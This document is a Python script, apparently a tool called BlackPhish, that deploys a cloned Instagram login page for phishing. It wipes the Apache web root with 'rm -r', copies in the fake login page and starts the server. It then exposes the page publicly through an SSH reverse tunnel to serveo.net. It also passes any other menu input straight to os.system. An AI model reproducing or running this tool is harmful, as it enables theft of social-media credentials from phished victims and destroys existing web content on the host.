#!/usr/bin/python3

# version 2.1: - Changed some colors and user interface - Added a menu

# Please update version number each time we update

try:
    import os

except ImportError():
    print("\033[31;1m" + "[!] Error importing")
    exit(1)

 # Variables #

cwd = os.getcwd()

# COLORS #

red = "\033[91;1m"

reset = "\033[0m"

green = "\033[92;1m"

cyan = "\033[96;1m"

yellow = "\033[93;1m"

magenta = "\033[95;1m"

blue = "\033[94;1m"

white = "\033[97;1m"



if os.geteuid() != 0:
    exit(red + "[!] Please run as root" + reset)



def serveo_forward(): # Port forward to serveo#
    os.system('ssh -o ServerAliveInterval=3000 -R inc0gnit0:80:localhost:80 serveo.net')
    #subprocess.Popen(["rm","-r","some.file"])
    
    
    
def banner(): # Banner #
    print('''
 \033[91;1m
                https://github.com/iinc0gnit0/BlackPhish \033[94;1m

                             ░███░                                   ░█░   
                           ░█████                                  ░███    
                          ▒█████▓                                ░███░     
                         ████████                               ████▓      
                       ░█████████░                            ░█████       
                     ░█████████████                          ░██████       
          ░░▒███████████████████████████░░░                 ▓██████░       
 ░░░░███████████████████████████████████████████▓░▒█░     ░███████░        
█████████████████████████████████████████████████████████████████          
 ░████████████████████████████████████████████████████████████████░        
     ░░▓██████████████████████████████████████▓░░░██▓      ░░██████░       
             ░░░░▒█████████████████████░████░                  ░█████░     
                  ██████                 ░                                 
                  ░█████                                                   
                   ░████                                                   
                    ░███                                                   
                      ░█      
                                                      \033[91m
        ▀█████████▄                      ▀████████▄
          ███    ███                       ███    ███  
          ███    ███                       ███    ███ 
          ███▄▄▄██▀                        ███    ███ 
          ███▀▀▀██▄                        ████████▀ 
          ███    ██▄\033[31m  ┬  ┌─┐┌─┐┬┌─ \033[91m        ███ \033[31m ┬ ┬┬┌─┐┬ ┬ \033[91m
          ███    ███\033[31m  │  ├─┤│  ├┴┐ \033[91m        ███\033[31m  ├─┤│└─┐├─┤\033[91m
        ▄█████████▀ \033[31m  ┴─┘┴ ┴└─┘┴ ┴ \033[91m        ███\033[31m  ┴ ┴┴└─┘┴ ┴\033[94;1m
        
                
                    Banner made by: \033[91m[tuf_unkn0wn]\033[94;1m
                    
                    Script created by: \033[91m[inc0gnit0] [retro0001]\033[94;1m
                    
                    Websites created by: \033[91m[TableFlipGod] \033[0m''')
    
    print('\n')

    print(red + '        [1] ' + blue + 'Instagram')
    
    print('\n')
    
    

def main():  # Main script #
    
    banner()

    choice = input(red + "        [BlackPhish] -> ") # Get user input #

    if choice == "1":
        print(green + '[+] Copying Files')
        print(green + '[+] Cleaning /var/www/html/')
        os.system('rm -r /var/www/html/ && mkdir /var/www/html/')
        os.system('cp '+'-r '+ cwd  + '/Instagram/Instagram-Login/index.html' " /var/www/html/")
        print(green + '[+] Starting Apache2 Service')
        os.system('service apache2 start')
        print(green + '[+] Apache2 Service Started')
        serveo_forward()
        print(green + '[+] Done')
        main()

    elif choice == "clear":
        os.system('clear')
        main()

    elif choice == "clean":
        print(green + '[+] Stopping Apache2 Service')
        os.system('service apache2 stop')
        print(green + '[+] Stopping Traffic forwarding to serveo')
        os.system('pkill -f inc0gnit0:80:localhost:80')
        print(green + '[+] Cleaning /var/www/html/')
        os.system('rm -r /var/www/html/ && mkdir /var/www/html')
        print(green + '[+] Done')
        main()
        
    elif choice == 'exit':
        print(red + '[!] Exiting...')
        print(green + '[+] Have a nice day!')
    
    elif choice != "":
        os.system(""+choice)
        main()

    else:
        print(red + "[!] Invalid option" + reset)
        main()
        
        

try: # This will start the script
    if __name__ == '__main__':
        main()

except KeyboardInterrupt: # Will detect if they exit #
    print("\n")
    print(red + "[!] KeyboardInterrupt Detected")
    print(red + "[!] Exiting" + reset)
    exit(0)
